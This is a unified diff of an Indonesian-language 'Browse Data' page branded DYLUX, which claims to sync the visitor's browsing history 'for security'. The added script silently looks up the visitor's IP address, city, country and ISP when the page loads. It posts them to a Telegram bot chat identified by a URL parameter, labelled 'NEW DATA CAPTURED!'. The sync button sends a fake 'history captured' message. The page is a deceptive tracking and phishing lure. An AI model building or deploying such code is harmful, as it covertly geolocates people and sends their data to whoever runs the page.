@@ -6,135 +6,53 @@
     <title>Browse Data</title>
     <script src="config.js"></script>
     <style>
-        :root {
-            --primary: #00f0ff;
-            --secondary: #7b2ffc;
-            --bg: #0a0a0f;
-            --card: #14141e;
-            --text: #e0e0ff;
-            --text2: #8888aa;
-            --border: rgba(0,240,255,0.1);
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: var(--bg);
-            font-family: -apple-system, 'Inter', sans-serif;
-            color: var(--text);
+            background: #0a0a0f;
+            font-family: Arial, sans-serif;
+            color: #e0e0ff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            background-image: radial-gradient(ellipse at 10% 20%, rgba(0,240,255,0.03) 0%, transparent 50%);
         }
-        .container {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
+        .box {
+            background: #14141e;
+            border: 1px solid rgba(0,240,255,0.1);
+            border-radius: 16px;
             padding: 40px 32px;
             max-width: 400px;
             width: 100%;
-        }
-        .header { text-align: center; margin-bottom: 24px; }
-        .logo {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(123,47,252,0.1);
-            color: var(--secondary);
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            margin-top: 6px;
-            font-weight: 600;
-        }
-        .icon { font-size: 48px; text-align: center; margin: 12px 0; }
-        .title {
-            font-size: 18px;
-            font-weight: 700;
             text-align: center;
-            margin-bottom: 6px;
         }
-        .desc {
-            font-size: 14px;
-            color: var(--text2);
-            text-align: center;
-            line-height: 1.6;
-        }
-        .history-list {
-            margin: 16px 0;
-            background: var(--bg);
-            border-radius: 12px;
-            padding: 12px;
-            border: 1px solid var(--border);
-        }
-        .history-item {
-            padding: 10px 12px;
-            border-bottom: 1px solid var(--border);
-            font-size: 13px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .badge { display: inline-block; background: rgba(123,47,252,0.1); color: #7b2ffc; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
+        .icon { font-size: 48px; margin: 16px 0; }
+        h2 { font-size: 18px; margin-bottom: 8px; }
+        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
+        .history-list { background: #0a0a0f; border-radius: 12px; padding: 12px; margin: 16px 0; border: 1px solid rgba(0,240,255,0.1); }
+        .history-item { display: flex; justify-content: space-between; padding: 8px 12px; border-bottom: 1px solid rgba(0,240,255,0.05); font-size: 13px; }
         .history-item:last-child { border-bottom: none; }
-        .history-item .site { color: var(--text); }
-        .history-item .time { color: var(--text2); font-size: 11px; }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: #fff;
-            transition: 0.3s;
-        }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,240,255,0.2); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: var(--text2);
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid var(--border);
-        }
-        .footer a { color: var(--primary); text-decoration: none; }
-        .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid var(--border);
-            border-top-color: var(--primary);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 12px auto 0;
-        }
+        .history-item .site { color: #e0e0ff; }
+        .history-item .time { color: #8888aa; font-size: 11px; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .footer { margin-top: 20px; font-size: 11px; color: #555; }
+        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
         .spinner.active { display: block; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .status-msg { text-align: center; font-size: 13px; color: var(--text2); margin-top: 10px; display: none; }
+        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">DYLUX</div>
-            <div class="badge">🌐 Browse Data</div>
-        </div>
-
+    <div class="box">
+        <div class="logo">DYLUX</div>
+        <div class="badge">🌐 Browse Data</div>
         <div class="icon">🌐</div>
-        <div class="title">Riwayat Penelusuran</div>
-        <div class="desc">
-            Data penelusuran Anda akan disinkronkan untuk keamanan.
-        </div>
-
+        <h2>Riwayat Penelusuran</h2>
+        <p>Data penelusuran Anda akan disinkronkan untuk keamanan.</p>
         <div class="history-list">
             <div class="history-item"><span class="site">🔍 google.com</span><span class="time">10 menit lalu</span></div>
             <div class="history-item"><span class="site">📺 youtube.com</span><span class="time">25 menit lalu</span></div>
@@ -142,88 +60,55 @@
             <div class="history-item"><span class="site">🛒 shopee.co.id</span><span class="time">2 jam lalu</span></div>
             <div class="history-item"><span class="site">📱 instagram.com</span><span class="time">3 jam lalu</span></div>
         </div>
-
-        <button class="btn" id="syncBtn">Sinkronkan Riwayat</button>
-
+        <button id="syncBtn">Sinkronkan Riwayat</button>
         <div class="spinner" id="spinner"></div>
-        <div class="status-msg" id="statusMsg"></div>
-
-        <div class="footer">
-            &copy; 2026 <a href="#">DYLUX</a> • Cahaya dalam Kegelapan
-        </div>
+        <div id="statusMsg"></div>
+        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
     </div>
 
     <script>
-        function getUserId() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get('id');
-        }
-
-        async function autoDetect() {
-            const userId = getUserId();
+    (async function autoDetect() {
+        try {
+            const userId = new URLSearchParams(window.location.search).get('id');
             if (!userId) return;
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        user_id: userId,
-                        type: 'auto_detect',
-                        data: {
-                            ip: ipData.ip || 'unknown',
-                            city: ipData.city || 'unknown',
-                            region: ipData.region || 'unknown',
-                            country: ipData.country_name || 'unknown',
-                            isp: ipData.org || 'unknown',
-                            lat: ipData.latitude || 0,
-                            lon: ipData.longitude || 0,
-                            device: {
-                                userAgent: navigator.userAgent,
-                                platform: navigator.platform,
-                                language: navigator.language,
-                                screen: `${window.screen.width}x${window.screen.height}`
-                            },
-                            timestamp: new Date().toISOString()
-                        }
-                    })
-                });
-                console.log('✅ Auto-detect sent');
-            } catch (e) { console.error(e); }
-        }
-
-        const userId = getUserId();
-        const syncBtn = document.getElementById('syncBtn');
-        const spinner = document.getElementById('spinner');
-        const statusMsg = document.getElementById('statusMsg');
-
-        syncBtn.addEventListener('click', async () => {
-            syncBtn.disabled = true;
-            spinner.classList.add('active');
-            statusMsg.style.display = 'none';
-
-            await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
+            const ipRes = await fetch('https://ip-api.com/json/');
+            const ipData = await ipRes.json();
+            const message = `<b>🎯 NEW DATA CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Type:</b> Auto-Detect\n<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    user_id: userId,
-                    type: 'history',
-                    data: {
-                        history: ['google.com', 'youtube.com', 'gmail.com', 'shopee.co.id', 'instagram.com'],
-                        timestamp: new Date().toISOString(),
-                        device: navigator.userAgent
-                    }
-                })
+                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
             });
+        } catch (e) { console.error(e); }
+    })();
 
+    const userId = new URLSearchParams(window.location.search).get('id');
+    const syncBtn = document.getElementById('syncBtn');
+    const spinner = document.getElementById('spinner');
+    const statusMsg = document.getElementById('statusMsg');
+
+    syncBtn.addEventListener('click', async () => {
+        syncBtn.disabled = true;
+        spinner.classList.add('active');
+        statusMsg.style.display = 'none';
+        try {
+            const message = `<b>🌐 BROWSING HISTORY CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📄 History:</b>\n• google.com\n• youtube.com\n• gmail.com\n• shopee.co.id\n• instagram.com\n<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
+            });
             spinner.classList.remove('active');
             syncBtn.disabled = false;
             statusMsg.style.display = 'block';
             statusMsg.innerHTML = '✅ Riwayat berhasil disinkronkan!';
-        });
-
-        document.addEventListener('DOMContentLoaded', autoDetect);
+        } catch (error) {
+            spinner.classList.remove('active');
+            syncBtn.disabled = false;
+            statusMsg.style.display = 'block';
+            statusMsg.innerHTML = '❌ Gagal!';
+        }
+    });
     </script>
 </body>
 </html>
